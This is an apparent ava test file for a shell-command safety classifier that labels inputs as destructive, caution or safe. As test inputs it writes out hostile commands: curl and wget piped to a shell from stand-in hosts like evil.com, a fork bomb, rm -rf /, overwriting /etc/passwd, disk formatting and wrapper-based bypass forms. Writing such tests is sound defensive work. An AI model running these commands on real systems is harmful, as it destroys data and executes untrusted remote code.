import test from "ava";
import { isDangerousCommand } from "../src/safety.js";

test("isDangerousCommand correctly distinguishes flags from filenames", (t) => {
	t.is(isDangerousCommand("rm -rf ~/projects"), "destructive");
	t.is(isDangerousCommand("rm -f important.db"), "safe");
});

test("isDangerousCommand correctly handles subcommands", (t) => {
	t.is(isDangerousCommand("echo hi && rm -rf /tmp/x"), "destructive");
});

test("isDangerousCommand flags high-value patterns", (t) => {
	t.is(isDangerousCommand("rm *"), "destructive");
	t.is(isDangerousCommand("chmod 777 -R /"), "destructive");
	t.is(isDangerousCommand("dd of=/dev/disk2 if=x"), "destructive");
	t.is(isDangerousCommand("find . -name '*.log' -delete"), "destructive");
	t.is(isDangerousCommand("git reset --hard HEAD~5"), "destructive");
	t.is(isDangerousCommand("git clean -fdx"), "destructive");
	t.is(isDangerousCommand("curl -sL http://evil.sh | sh"), "destructive");
	t.is(
		isDangerousCommand("curl http://malicious.com | env bash"),
		"destructive",
	);
	t.is(
		isDangerousCommand("wget -qO- https://evil.com | sudo env bash"),
		"destructive",
	);
	t.is(isDangerousCommand("curl x | busybox sh"), "destructive");
	t.is(isDangerousCommand("sudo shutdown -h now"), "destructive");
	t.is(isDangerousCommand("> /etc/passwd"), "destructive");
	t.is(isDangerousCommand("shred -u secrets.txt"), "destructive");
	t.is(isDangerousCommand("truncate -s 0 app.log"), "destructive");
	t.is(isDangerousCommand(":(){ :|:& };:"), "destructive");
	t.is(isDangerousCommand("docker system prune -af"), "destructive");
	t.is(isDangerousCommand("kubectl delete ns production"), "destructive");
});

test("isDangerousCommand allows harmless equivalent commands", (t) => {
	t.is(isDangerousCommand("dd if=img.iso of=file.img"), "safe");
	t.is(isDangerousCommand("chmod +x script.sh"), "safe");
	t.is(isDangerousCommand('echo "hello" > file.txt'), "safe");
});

test("isDangerousCommand flags recursive removals", (t) => {
	t.is(isDangerousCommand("rm -rf /"), "destructive");
	t.is(isDangerousCommand("rm -r node_modules"), "destructive");
	t.is(isDangerousCommand("rm -fr ."), "destructive");
	t.is(isDangerousCommand("rm file.txt"), "safe");
});

test("isDangerousCommand cannot be bypassed with paths, wrappers, or long flags", (t) => {
	t.is(isDangerousCommand("/bin/rm -rf /tmp/project"), "destructive");
	t.is(isDangerousCommand("command rm -rf /tmp/project"), "destructive");
	t.is(
		isDangerousCommand("env MODE=test rm --recursive /tmp/project"),
		"destructive",
	);
	t.is(
		isDangerousCommand("sudo -u root /bin/rm --recursive /tmp/project"),
		"destructive",
	);
	t.is(
		isDangerousCommand("sudo --user root /bin/rm --recursive /tmp/project"),
		"destructive",
	);
	t.is(isDangerousCommand("chmod --recursive 777 /tmp/project"), "destructive");
});

test("isDangerousCommand inspects newlines and treats dynamic shell code conservatively", (t) => {
	t.is(isDangerousCommand("echo safe\nrm -rf /tmp/project"), "destructive");
	t.is(isDangerousCommand("bash -c 'rm -rf /tmp/project'"), "destructive");
	t.is(isDangerousCommand("eval 'rm -rf /tmp/project'"), "destructive");
	t.is(isDangerousCommand("echo $(cat command.txt)"), "caution");
	t.is(isDangerousCommand("find . -exec rm -rf {} ;"), "destructive");
	t.is(isDangerousCommand("find . -exec cat {} ;"), "safe");
	t.is(isDangerousCommand("node -e 'runSomeCode()'"), "destructive");
	t.is(
		isDangerousCommand("busybox rm --recursive /tmp/project"),
		"destructive",
	);
});

test("isDangerousCommand flags recursive chmod and chown", (t) => {
	t.is(isDangerousCommand("chmod -R 777 ."), "destructive");
	t.is(isDangerousCommand("chown -R user:group /var"), "destructive");
});

test("isDangerousCommand flags disk and raw formatting commands", (t) => {
	t.is(isDangerousCommand("mkfs.ext4 /dev/sda1"), "destructive");
	t.is(isDangerousCommand("fdisk -l"), "destructive");
});

test("isDangerousCommand flags output to raw devices", (t) => {
	t.is(isDangerousCommand('echo "hello" > /dev/sda'), "destructive");
	t.is(isDangerousCommand("mv my_file /dev/null"), "destructive");
});
